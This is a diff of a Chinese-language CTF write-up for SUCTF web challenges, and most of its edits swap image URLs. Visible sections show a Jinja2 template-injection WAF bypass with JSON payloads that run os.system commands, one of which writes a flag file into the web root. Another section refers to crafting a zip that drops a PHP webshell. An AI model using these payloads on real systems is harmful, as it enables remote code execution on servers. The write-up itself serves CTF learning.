@@ -13,19 +13,19 @@
 
 找到个password：`SePassWordLen23SUCT`
 
-![image-20250111104355723](https://bu.dusays.com/2025/01/14/6786659c1293a.png)
+![image-20250111104355723](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808077.png)
 
 加密方式：`PBEWithMD5AndDES`
 
-![image-20250111104506261](https://bu.dusays.com/2025/01/14/6786659cdabfa.png)
+![image-20250111104506261](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808074.png)
 
 感觉hacker这个用户里的密码就是盐，但是爆破出来是 hacker（怎么不是8位）
 
-![image-20250111112916052](https://bu.dusays.com/2025/01/14/6786659c113cc.png)
+![image-20250111112916052](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808083.png)
 
 迭代次数应该是默认的1000，不行的话爆破也行，OUTPUT应该就是密文：`ElV&#43;bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=`
 
-![image-20250111113010366](https://bu.dusays.com/2025/01/14/6786659d68b8a.png)
+![image-20250111113010366](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808091.png)
 
 后来发现不用盐也可以解密，密码`SePassWordLen23SUCT`其实是暗示密码length为23，其实应该是SUCTF，照着加密脚本：https://blog.csdn.net/iin729/article/details/128432332，叫ai写了个python解密脚本
 
@@ -103,7 +103,7 @@ if __name__ == &#34;__main__&#34;:
     main()
 ```
 
-![image-20250111204056225](https://bu.dusays.com/2025/01/14/6786659c0d186.png)
+![image-20250111204056225](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808087.png)
 
 ### SU_RealCheckin
 
@@ -404,17 +404,17 @@ def cwaf(value):
 
 过滤了`__loader__`，随便找个模块引入其`__spec__`就能重新拿到 loader 了
 
-![image-20250112210039329](https://bu.dusays.com/2025/01/14/6786659c1451d.png)
+![image-20250112210039329](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808653.png)
 
 跟进其模板编译的地方会发现在进行编译前先 sorted 了一下，也就是将列表中的值按第一个值的 ASCII 大小排序了一下
 
-![image-20250112210337677](https://bu.dusays.com/2025/01/14/6786659ce7467.png)
+![image-20250112210337677](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808687.png)
 
 参考文章中的payload为`*;import os;os.system(&#39;id&#39;)`，`*`字符在ascii表中的顺序是在字母和数字之前的，所以我们的 payload 传入的时候无论插在列表中哪个位置，经过 sorted 后都会排在第一个，而恰好waf中没有过滤数字2，所以我们把 payload 插在列表中索引为2的位置即可
 
-![image-20250112211035055](https://bu.dusays.com/2025/01/14/6786659cd8601.png)
+![image-20250112211035055](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808714.png)
 
-![image-20250112211058415](https://bu.dusays.com/2025/01/14/6786659c513ce.png)
+![image-20250112211058415](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808745.png)
 
 本地测试一下，传入 payload 后要重新访问下 `Admin` 路由，同时记得传参，这样才能让 jinja2 编译模板，payload
 
@@ -422,7 +422,7 @@ def cwaf(value):
 {&#34;key&#34;:&#34;__init__.__globals__.config.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&#34;,&#34;value&#34;:&#34;*;import os;os.system(&#39;whoami&#39;)&#34;}
 ```
 
-![image-20250114213536459.png](https://bu.dusays.com/2025/01/14/678668305a494.png)
+![image-20250112211418356](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808778.png)
 
 最终payload
 
@@ -430,17 +430,17 @@ def cwaf(value):
 {&#34;key&#34;:&#34;__init__.__globals__.config.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2&#34;,&#34;value&#34;:&#34;*;import os;os.system(&#39;/rea* &gt; /var/www/html/myblog/app/6s6630.txt&#39;)&#34;}
 ```
 
-![image-20250112212901895](https://bu.dusays.com/2025/01/14/6786659c14836.png)
+![image-20250112212901895](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174808810.png)
 
 ### SU_photogallery
 
 404页面
 
-![image-20250112224946632](https://bu.dusays.com/2025/01/14/6786659ca1358.png)
+![image-20250112224946632](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174809194.png)
 
 参考 [FSCTF 2023]签到plus 尝试打下 php＜= 7 . 4 . 21 development server源码泄露，其实随便访问一下就出源码了
 
-![image-20250113145501213](https://bu.dusays.com/2025/01/14/6786659c99d4b.png)
+![image-20250113145501213](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174809236.png)
 
 unzip.php
 
@@ -638,7 +638,7 @@ with open(&#34;shell-test630.zip&#34;, &#34;wb&#34;) as f:
     f.write(mf.getvalue())
 ```
 
-然后访问 `upload/suimages/shell-test630.php` rce即可
+
 
 
 
